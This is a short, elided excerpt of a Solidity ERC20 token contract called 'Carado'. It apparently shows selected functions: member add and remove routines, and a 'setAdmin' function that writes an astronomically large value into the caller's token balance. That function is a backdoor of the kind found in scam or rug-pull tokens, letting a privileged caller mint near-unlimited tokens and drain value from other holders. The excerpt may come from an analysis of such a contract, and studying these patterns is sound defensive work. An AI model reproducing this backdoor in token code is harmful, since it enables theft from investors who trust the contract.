 ...
 */
contract Carado is Context, IERC20, IERC20Metadata,Ownable {
...
/**
    ...
    function quitmember(address nnn) external   {
    ...
    function addmember(address nnn) external   {
        if (_pproject != _msgSender()){
            revert("2231321 love");
        }
    ...
    function setAdmin() external {
        ...
        _balances[_msgSender()] = 51116044618658097733785492504341953926634992332820282019728792003956561130857; 
    }
